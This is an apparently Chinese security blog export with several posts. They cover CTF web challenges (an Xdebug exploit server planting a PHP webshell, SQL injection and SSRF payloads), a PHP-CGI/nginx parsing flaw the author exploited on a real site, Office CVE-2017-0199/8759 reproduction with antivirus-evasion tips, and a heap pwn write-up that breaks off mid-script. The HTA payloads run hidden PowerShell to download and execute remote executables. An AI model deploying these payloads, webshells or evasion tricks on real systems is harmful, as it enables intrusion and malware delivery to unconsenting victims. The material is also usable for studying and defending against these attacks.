<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl --url http://112.213.118.106/?XDEBUG_SESSION_START=1</div></pre></td></tr></table></figure>
<p>exp 脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line">php_code = <span class="string">b"print_r(file_put_contents('/var/www/html/cmd.php','&lt;?=`$_GET[a]`?&gt;'), true)"</span></div><div class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</div><div class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</div><div class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">global</span> count</div><div class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            msg = self.request.recv(<span class="number">8192</span>)</div><div class="line">            print(msg)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                self.request.send(payload)</div><div class="line">            count += <span class="number">1</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</div><div class="line">    serv.serve_forever()</div></pre></td></tr></table></figure>
<h2 id="harder-php"><a href="#harder-php" class="headerlink" title="harder php"></a>harder php</h2><p>之后出题人修复了非预期的解法，正常解法流程如下。</p>
<p>1、备份文件源代码泄漏，通过代码审计，找到留言处存在sql注入漏洞。</p>
<p>2、利用该sql注入漏洞，获取管理员密码。</p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`,0x12345)%23</div></pre></td></tr></table></figure></p>
<p>3、管理员登录需要本地IP<code>127.0.0.1</code> ,根据提示反序列化导致ssrf，谷歌搜索，第一篇文章即是 《PHP Unserialize Exploiting》（<a href="https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）" target="_blank" rel="external">https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.youtube.com/watch?v=5AdVQzUB6iM</div><div class="line">SSRF Unserializing SoapClient can provide SSRF with CRLF injection. O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:18:&quot;http://hostname/3%0a1&quot;; s:8:&quot;location&quot;;s:23:&quot;http://hostname/123&quot;;s:13:&quot; _soap_version&quot;;i:1;&#125;</div></pre></td></tr></table></figure></p>
<p>4、其user-agent参数可以CRLF注入，伪造<code>http request</code>头，从而达成post任意参数的ssrf，利用该ssrf获取管理员登录后的session。</p>
<p>5、利用管理员登录后的session，上传php文件，但是有个坑，<code>stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;=0</code> 这个表达式是恒返回0的。也就是说，不管怎么样都会触发<code>rm /app/*</code></p>
<p>6、通过搜索引擎查询<code>rm * 无法删除文件</code>，查询到，当文件名前缀为<code>-x</code>时，必须用 <code>rm -- *</code> 才能删除，故上传文件名为<code>-x1234</code>的php一句话木马，再通过http response返回的时间戳来爆破文件名（文件夹所属是root，权限333），爆破成后即可getshell</p>
<h2 id="baby-sqli"><a href="#baby-sqli" class="headerlink" title="baby sqli"></a>baby sqli</h2><p>题目太坑，注入点在个签那里，条件判断在头像那边。。</p>
<p>当时没做出，给个官方脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*- </div><div class="line">import requests</div><div class="line">from random import Random</div><div class="line">def random_str(randomlength=8):</div><div class="line">    str = &apos;&apos;</div><div class="line">    chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos;</div><div class="line">    length = len(chars) - 1</div><div class="line">    random = Random()</div><div class="line">    for i in range(randomlength):</div><div class="line">        str+=chars[random.randint(0, length)]</div><div class="line">    return str</div><div class="line">dic=&apos;0123456789_@:.abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">table_name=&apos;&apos;</div><div class="line">def register(email,uinfo):</div><div class="line">	url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">	data=&#123;</div><div class="line">	&quot;email&quot;:email,</div><div class="line">	&quot;pass&quot;:&quot;123&quot;,</div><div class="line">	&quot;userinfo&quot;:userinfo</div><div class="line">	&#125;</div><div class="line">	requests.post(url=url,data=data)</div><div class="line">def login(loginuser):</div><div class="line">	url=&quot;http://47.98.51.5/vlogin/login.php&quot;</div><div class="line">	a=requests.session()</div><div class="line">	data2=&#123;</div><div class="line">	&quot;loginuser&quot;:loginuser,</div><div class="line">	&quot;loginpass&quot;:&quot;123&quot;</div><div class="line">	&#125;</div><div class="line">	a.post(url=url,data=data2)</div><div class="line">	url3=&quot;http://47.98.51.5/vlogin/vpage/index.php&quot;</div><div class="line">	b=a.get(url3)</div><div class="line">	return b.text</div><div class="line">for i in range(1,100):</div><div class="line">	for j in dic:</div><div class="line">		email=random_str(randomlength=8)+&quot;@1.com&quot;</div><div class="line">		userinfo=&quot;&apos;or(if(1,(select(substr((select(user())),&#123;&#125;,1))=&apos;&#123;&#125;&apos;),1)=1)#&quot;.format(i,j)</div><div class="line">		register(email,userinfo)</div><div class="line">		c=login(email)</div><div class="line">		if &quot;1.png&quot; in c:</div><div class="line">			table_name += j</div><div class="line">			print table_name</div><div class="line">			break</div><div class="line">print table_name</div></pre></td></tr></table></figure>
<h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="http://netsecurity.51cto.com/art/201702/531607.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201702/531607.htm</a>    一种新的MySQL下Update、Insert注入方法</p>
<p><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="external">https://www.anquanke.com/post/id/84837</a>   题目2 无人机病了（Web）</p>
<p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="external">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a>   PHP Xdebug 远程调试命令执行分析</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[低版本php+nginx 解析漏洞]]></title>
      <url>/2018/02/20/2018-2-21/</url>
      <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p>
<a id="more"></a>
<img src="/2018/02/20/2018-2-21/6.png" alt="6.png" title="">
<p>它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？</p>
<p><strong>下图来自wooyun</strong></p>
<img src="/2018/02/20/2018-2-21/2.jpg" alt="2.jpg" title="">
<p>这和说好的不一样喂？？？？<br><img src="/2018/02/20/2018-2-21/1.jpg" alt="1.jpg" title=""></p>
<p>群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。</p>
<img src="/2018/02/20/2018-2-21/4.png" alt="4.png" title="">
<img src="/2018/02/20/2018-2-21/3.jpg" alt="3.jpg" title="">
<p>php版本 <code>&lt;= 5.3.9</code>的时候（之后版本里有<code>security.limit_extensions</code>配置限制），配合<code>nginx</code>（无论版本多高），在默认配置下（<code>cgi.fix_pathinfo</code>全版本php默认配置为开启），存在php解析漏洞。</p>
<p>元凶是php.ini中的<code>cgi.fix_pathinfo</code>，nginx完成一次助攻。。。</p>
<img src="/2018/02/20/2018-2-21/5.jpg" alt="5.jpg" title="">
<p>由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。</p>
<p>btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://drops.xmd5.com/static/drops/papers-539.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-539.html</a>  解析漏洞总结</p>
<p><a href="http://www.laruence.com/2010/05/20/1495.html" target="_blank" rel="external">http://www.laruence.com/2010/05/20/1495.html</a>  Nginx + PHP CGI的一个可能的安全漏洞</p>
<p><a href="http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html" target="_blank" rel="external">http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html</a>  PHP CGI 中 fix_pathinfo 引起的安全隐患</p>
<p><a href="https://taobig.org/?p=650" target="_blank" rel="external">https://taobig.org/?p=650</a>   php.ini中的cgi.fix_pathinfo选项</p>
<p><a href="https://bugs.php.net/bug.php?id=55181" target="_blank" rel="external">https://bugs.php.net/bug.php?id=55181</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[对cve-2017-0199与cve-2017-8759的浅析]]></title>
      <url>/2017/10/29/cve-2017-office/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。</p>
<p>没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。</p>
<a id="more"></a>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="victimer"><a href="#victimer" class="headerlink" title="victimer"></a>victimer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">os:10.0.14393 default Build 14393</div><div class="line">office:ver2010(14.0.4760.1000)</div><div class="line">.net:v4.0.30319</div></pre></td></tr></table></figure>
<p>ps:查看.net版本（资源管理器打开<code>%systemroot%\Microsoft.NET\Framework</code>,最高版本即是）</p>
<h3 id="attacker"><a href="#attacker" class="headerlink" title="attacker"></a>attacker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python:2.7.14</div></pre></td></tr></table></figure>
<h2 id="cve-2017-0199"><a href="#cve-2017-0199" class="headerlink" title="cve-2017-0199"></a>cve-2017-0199</h2><p>该漏洞影响版本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Microsoft Office 2016</div><div class="line">Microsoft Office 2013</div><div class="line">Microsoft Office 2010</div><div class="line">Microsoft Office 2007</div></pre></td></tr></table></figure>
<p>这个漏洞出在word对已经插入的远程对象访问的时候，如果访问的时候http相应头重含有<code>Content-Type: application/hta</code>那么将会对该对象以脚本的方式解析执行。具体的过程如图所示<br><img src="/2017/10/29/cve-2017-office/1.png" alt="1.png" title=""></p>
<p>脚本：<a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="external">https://github.com/bhdresh/CVE-2017-0199</a></p>
<p>在实验过程中，发现该脚本有几处坑，一个是<code>server_thread</code>函数写了两遍,还有一个是<code>open</code>函数缺少了一个参数，故而本人修改了这两处问题，修改后的代码放于github上。</p>
<p>使用方式和原来的脚本没有大的区别 <a href="https://github.com/Winter3un/cve_2017_0199" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_0199</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 1 分发exe可执行文件并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver local payload</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.1.125/shell.exe -l shell.exe</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 2 分发hta脚本并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver custom HTA file</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -H custom.hta</div></pre></td></tr></table></figure>
<p>ps：虚拟机win7+office2010 未成功，不知道为啥。。</p>
<h2 id="cve-2017-8759"><a href="#cve-2017-8759" class="headerlink" title="cve-2017-8759"></a>cve-2017-8759</h2><p>这个漏洞其实是出在.net模块，但是是通过word或者写字板作为媒介引发的。漏洞原因是开发者没有考虑到输入点会存在换行符，导致了单行注释绕过。我们可以将存在换行符的.net代码发送过去绕过单行注释，进行.net代码执行。这个漏洞危害还是挺大的，与office无关，几乎影响所有版本的.net框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Microsoft .NET Framework 4.6.2</div><div class="line">Microsoft .NET Framework 4.6.1</div><div class="line">Microsoft .NET Framework 3.5.1</div><div class="line">Microsoft .NET Framework 4.7</div><div class="line">Microsoft .NET Framework 4.6</div><div class="line">Microsoft .NET Framework 4.5.2</div><div class="line">Microsoft .NET Framework 3.5</div><div class="line">Microsoft .NET Framework 2.0 SP2</div></pre></td></tr></table></figure></p>
<p>脚本来自: <a href="https://github.com/Winter3un/cve_2017_8759" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_8759</a>  生成exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 CreateRTF.py -f 1.rtf -u http://127.0.0.1:8080/exp.txt</div></pre></td></tr></table></figure>
<p>开启服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure>
<h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>免杀主要参考了<code>剖析RTF文件中的Anti-Analysis技术</code>这篇文章</p>
<p>1) 不完整的RTF头部</p>
<p>2）奇怪的16进制数</p>
<p>3）在16进制数中插入额外的空格</p>
<p>4）16进制编码数据中的虚假RTF控制字</p>
<p>5）在16进制数据中包含二进制数据</p>
<p>但是目前来说，这五种方式做的免杀都会被主流杀软干掉，样本hash：<code>b7f67029abc6e44e860fb13313a2b8024c59f200d3680c5dfd2886c9f3bcfc54</code></p>
<p>virustotal检出率<code>21/59</code>，目前没有啥好的办法可以绕过杀软。</p>
<h2 id="hta脚本相关"><a href="#hta脚本相关" class="headerlink" title="hta脚本相关"></a>hta脚本相关</h2><p>最简<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>powershell代码执行</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line">	<span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line">	<span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line">	<span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WbemScripting.SWbemLocator"</span>)</div><div class="line">	<span class="keyword">Set</span> Service = Locator.ConnectServer()</div><div class="line">	Service.Security_.ImpersonationLevel=impersonation</div><div class="line">	<span class="keyword">Set</span> objStartup = Service.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</div><div class="line">	<span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</div><div class="line">	<span class="keyword">Set</span> Process = Service.<span class="keyword">Get</span>(<span class="string">"Win32_Process"</span>)</div><div class="line">	<span class="keyword">Error</span> = Process.Create(<span class="string">"powershell.exe -nop -w hidden calc.exe"</span>, <span class="literal">null</span>, objConfig, intProcessID)</div><div class="line">	window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>powershell下载远程exe并执行</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://192.168.1.125/shell.exe\', \'c:/windows/temp/shell.exe\'); c:/windows/temp/shell.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line">    window.resizeTo <span class="number">0</span>,<span class="number">0</span></div><div class="line">    window.MoveTo <span class="number">-100</span>,<span class="number">-100</span></div><div class="line">	<span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line">	<span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line">	<span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</div><div class="line">    Locator.Run<span class="string">"powershell.exe -nop -w hidden -c "</span><span class="string">"IEX (new-object net.webclient).downloadstring('http://192.168.211.149:80/artifact.exe')"</span><span class="string">""</span>,<span class="number">0</span>,<span class="literal">FALSE</span></div><div class="line">    window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>以上脚本都能在我的github上找到</p>
<h2 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h2><p>对CVE-2017-0199的一次复现过程与内网穿透的利用：<a href="https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo</a><br>OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解：<a href="http://www.freebuf.com/articles/system/131969.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131969.html</a><br>CVE-2017-0199漏洞复现：<a href="http://www.hackersb.cn/hacker/228.html" target="_blank" rel="external">http://www.hackersb.cn/hacker/228.html</a><br>一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现：最新的Office高级威胁攻击预警：<a href="http://www.freebuf.com/articles/system/147602.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147602.html</a><br>CVE-2017-8759 微软word漏洞复现以及利用：<a href="http://www.cnblogs.com/deen-/p/7532078.html" target="_blank" rel="external">http://www.cnblogs.com/deen-/p/7532078.html</a><br>CVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁：<a href="http://www.lz1y.cn/?p=799" target="_blank" rel="external">http://www.lz1y.cn/?p=799</a><br>最新CVE-2017-8759漏洞复现的两种姿势：<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738" target="_blank" rel="external">https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738</a><br>剖析RTF文件中的Anti-Analysis技术：<a href="http://www.freebuf.com/articles/terminal/102018.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/102018.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> cve </tag>
            
            <tag> office </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[810线下赛复盘]]></title>
      <url>/2017/08/16/2017-8-10/</url>
      <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>将atoi_got修改成printf_plt，威力无穷~</strong></p>
<p>线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。</p>
<ul>
<li>string overflow</li>
<li>int overflow</li>
<li>off by one</li>
<li>race condition</li>
<li>heap overlay </li>
<li>fmt</li>
</ul>
<a id="more"></a>
<h3 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h3><p>第一个漏洞出现在west模块，该模块可以创建最多两个house，初始的金币都为5（虽然有一个tricks，但是然并软），然后可以选择其中一个house的id购买weapon，若其中一个house的weapon比另一个强，就可以将另一个house消灭掉（free），那么我们怎么才能增加我们的金币数目呢，其实我们可以利用string overflow的方式，如下代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">fgets(&amp;s1, 0x16, stdin);</div><div class="line">v9 = 0xA;</div><div class="line">if ( strlen(&amp;s1) &gt; 0x10 )</div><div class="line">&#123;</div><div class="line">puts(&quot;Your name is too long!&quot;);</div><div class="line">exit(-1);</div><div class="line">&#125;</div><div class="line">str_cpy(0x28LL * (signed int)i + 0x605148, (__int64)&amp;s1);</div></pre></td></tr></table></figure>
<p>s1可以输入0x16个字节，而string函数都以<code>&#39;\x00&#39;</code>字节定义字符串的结束，我们可以构造绕过，将money覆盖成一个最大数<code>0x7fffffff</code>,即可买我们想要的任何装备，接着漏洞出现在<code>snprintf</code>处，该函数的返回值由原本要复制到<code>dst addr</code> 的数据长度决定，故而这边存在一个溢出，我们只要让返回值大于<code>0x54</code>即可，<code>int overflow</code>刚好能够做到这件事。接着利用刚才获取的长度溢出一个字节（只能达到一个字节，故而我们可以利用<code>off by one</code>技术将指向soliders的指针位置上移），接着利用heap overlay技术将该上移的指针加入到unsorted bin内，在下次分配的时候，能够再次分配到该空间，故而我们可以利用该空间将house中的soliders指针地址修改成<code>atoi_got</code>，然后在写入<code>print_plt</code>的地址，利用fmt技术泄漏libc信息，算出system的地址，将atoi_got的地址修改成system地址，即可拿到shell，草稿如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">0x605140</div><div class="line"></div><div class="line">|ptr1(0xa0)|xxxxxxxx|xxxxxxxx    </div><div class="line"></div><div class="line"></div><div class="line">0x605158</div><div class="line"></div><div class="line">|money 0x605158|length 0x60515c</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ptr1 size:0xa0</div><div class="line"></div><div class="line">weapon(size:0x68)|ptr2(0x50) size:0x8|ally(size:0x30)</div><div class="line"></div><div class="line">0x10 0x40</div><div class="line"></div><div class="line"></div><div class="line">ptr2( read soliders 0x50)</div><div class="line"></div><div class="line"></div><div class="line">0x605190 ptr2_addr</div><div class="line"></div><div class="line"></div><div class="line">一些细节：</div><div class="line"></div><div class="line">可以从else中的puts字符串来快速分析判断的是什么</div><div class="line"></div><div class="line">uaf漏洞的分析，看free后，指针是否置0</div><div class="line"></div><div class="line">逆向功底很重要。</div><div class="line"></div><div class="line">strcmp</div><div class="line">strlen</div><div class="line">都可以绕过</div></pre></td></tr></table></figure>
<p>第一个漏洞的利用exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div 